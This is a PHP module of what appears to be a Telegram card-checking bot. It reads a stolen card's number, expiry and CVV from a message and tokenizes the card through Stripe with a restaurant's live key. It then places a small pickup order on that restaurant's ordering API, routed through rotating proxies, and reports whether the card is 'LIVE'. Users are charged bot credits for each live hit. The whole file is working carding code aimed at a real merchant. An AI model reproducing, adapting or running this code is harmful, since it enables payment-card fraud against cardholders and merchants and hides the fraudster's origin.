<?php 

	$bot->P_USER();
    $bot->V_USER();
    $bot->AntiSpam();
    $bot->C_CREDITS();
    $bot->status_gate($message);
    $name_gate = $bot->getGatename($message);
	$rango = ucfirst(strtolower($bot->getRango()));
	$lista = $bot->comprobador($message);
	$cards = explode("|", $lista);
	$cc 	= $cards[0];
	$month 	= $cards[1];
	$year 	= $cards[2];
	$cvv 	= $cards[3];
	$bot->lunh($cc);
	$bin_data = $bot->ConsultBin(substr($cc, 0, 6));

	$bot->SendMessage("<b>[ ⭑ ] Status: <i>Consulting</i>✅\n[ ⭑ ] Gate: <i>$name_gate</i>\n$bin_data\n[ ⭑ ] Card: <code>$lista</code></b>");
	$bot->UpdateAntiSpam();

	$retry = 0;
	$cookie = uniqid();
	$time_start = microtime(true);

	start:

	if ($retry > 2) {
		$bot->EditMessage("<b>[ ⭑ ] Status: <i>Max Retry</i>❌\n[ ⭑ ] Gate: <i>$name_gate</i>\n$bin_data\n[ ⭑ ] Card: <code>$lista</code></b>");
		exit;
	}
	
	$data = json_decode($bot::Proxy($bot::GetRandVal("webshare_auth.txt")));

	if ($data->status == "Dead") {
		file_put_contents("dead_proxys.txt", $data->proxy.PHP_EOL , FILE_APPEND);
		$retry++;
		goto start;
	}

	$proxy = [
	    "METHOD" => "CUSTOM",
	    "SERVER" => $bot::RanArray(['socks5://p.webshare.io:1080','http://p.webshare.io:80']),
	    "AUTH"   => $bot::GetRandVal("webshare_auth.txt")
	];


	$Ip_Lookup = $bot->getIP($proxy);
    $IP = $Ip_Lookup->Ip;
    $Country_IP = $Ip_Lookup->CountryCode;
    $Ip_Flag = $tools->GetFlag($Country_IP);

    $fake_proxy = substr($IP, 0, 8).'x'.'x'.substr($IP, -4);

	$payload = [
		'card[number]'=>$cc,
		'card[cvc]'=>$cvv,
		'card[exp_month]'=>$month,
		'card[exp_year]'=>$year,
		'card[address_zip]'=>$postcode,
		'guid'=>'b22997c4-cec3-4ed8-a088-21af68d272ad2baccc',
		'muid'=>'39a1fb17-ae77-455e-a77c-875880641db7072353',
		'sid'=>'b514e752-48d4-4f83-96bf-8f0ec429fd97c7cf06',
		'payment_user_agent'=>'stripe.js/5c8191be7; stripe-js-v3/5c8191be7',
		'time_on_page'=>'47107',
		'key'=>'pk_live_Sq151n5SUu6qAtZDKtSdw0tv',
		'pasted_fields'=>'number'
	];

	$r1 = $bot::Post('https://api.stripe.com/v1/tokens', http_build_query($payload), null, $cookie, $proxy)->body;

	$id = json_decode($r1)->id;
	$token_card = json_decode($r1)->card->id;

	if (empty($r1) || empty($id) || empty($token_card)) {
		$retry++;
		goto start;
	}


	$bot->EditMessage("<b>[ ⭑ ] Status: <i>Processing</i>✅\n[ ⭑ ] Gate: <i>$name_gate</i>\n$bin_data\n[ ⭑ ] Card: <code>$lista</code></b>");


	$payload = '{"items":[{"id":1663477713403,"sub":"Signature Soups 🥄 ","name":{"en":"Tomato Basil "},"price":"cup. 4.95, bowl. 5.95","modgroups":[{"default":null,"modifiers":[{"name":"Cup","id":"half","price":4.95},{"price":5.95,"id":"full","name":"Bowl"}],"name":"Pick a Size","type":"single","required":true,"id":"size"}],"customerPicks":{"half":true,"full":false},"productId":"APv9GJifOder3ALx1gMr","quantity":1}],"phone":"'.$phone.'","cartType":"PICKUP","appliedCashback":0,"deliveryAddress":null,"distanceInMiles":null,"paymentType":"CARD","name":"dsad sadsad","unitNumber":"","deliveryInstructions":"","pickupTime":"1663713019166","deliveryTime":null,"r_id":"meltit","stripeToken":{"id":"'.$id.'","object":"token","card":{"id":"'.$token_card.'","object":"card","address_city":null,"address_country":null,"address_line1":null,"address_line1_check":null,"address_line2":null,"address_state":null,"address_zip":"'.$postcode.'","address_zip_check":"unchecked","brand":"Visa","country":"US","cvc_check":"unchecked","dynamic_last4":null,"exp_month":5,"exp_year":2024,"funding":"debit","last4":"7663","name":null,"tokenization_method":null},"client_ip":"'.$ip.'","created":1663477746,"livemode":true,"type":"card","used":false},"totals":{"numberOfMarketPriceItems":0,"totalPrice":4.95,"discount":0,"deliveryFeeInCents":0,"subtotal":4.95,"tax":0.51,"allServiceFee":0,"preTipTotalWithTax":5.46,"invoice":6.46,"preTipPrimaryCents":100},"analytics":{"queryStringHistory":[{"ts":1663477699247,"qs":""}]},"referrer":"","promoCode":"","clientVersion":"v5.0-ninja","dineInOption":"","tabNumber":""}';

	$headers = [
		'accept: */*',
		'accept-language: es-MX,es;q=0.9',
		'content-type: application/json',
		'origin: https://agrilledcheeseco.com',
		'referer: https://agrilledcheeseco.com/',
	];

	$r2 = $bot::Post('https://p39pffu1q4.execute-api.us-west-1.amazonaws.com/v18-sushi-mods/orders', $payload, $headers, $cookie, $proxy)->body;

	if (empty($r2)) {
		$retry++;
		goto start;
	}

	$datos = $Response::Stripe($r1, $r2);

	file_put_contents("test.txt", json_encode(['r1' => $r1, 'r2' => $r2]));

	$execution_time = (microtime(true) - $time_start);
	$time = substr($execution_time, 0, 4);

	if (strpos($datos->status, "LIVE") !== false) {
		$mensaje = "<b><u>あ $name_gate</u>\n\n[ ⭑ ] Card: <code>$lista</code>\n[ ⭑ ] Status:  <i>{$datos->status}.</i> ✅\n[ ⭑ ] Message: <i>{$datos->response}</i>\n\n$bin_data\n\n[ ⭑ ] Retries: <i>$retry 🔄</i>\n[ ⭑ ] Proxy : <i>$fake_proxy $Country_IP [$Ip_Flag]</i>\n[ ⭑ ] Checked by: <a href='tg://user?id=$from_id'>$username</a>[$rango]\n[ ⭑ ] Time taken: <i>{$time}s</i>\n[ ⭑ ] Bot by: <a href='tg://user?id=1260898878'>ThevenRex</a></b>";
		$bot->Descuento_Credits(5);
	}else{
		$mensaje = "<b><u>あ $name_gate</u>\n\n[ ⭑ ] Card: <code>$lista</code>\n[ ⭑ ] Status:  <i>{$datos->status}.</i> ❌\n[ ⭑ ] Message: <i>{$datos->response}</i>\n\n$bin_data\n\n[ ⭑ ] Retries: <i>$retry 🔄</i>\n[ ⭑ ] Proxy : <i>$fake_proxy $Country_IP [$Ip_Flag]</i>\n[ ⭑ ] Checked by: <a href='tg://user?id=$from_id'>$username</a>[$rango]\n[ ⭑ ] Time taken: <i>{$time}s</i>\n[ ⭑ ] Bot by: <a href='tg://user?id=1260898878'>ThevenRex</a></b>";
	}


	$bot::DeleteAllCookies();

	$bot->EditMessage($mensaje);


 ?>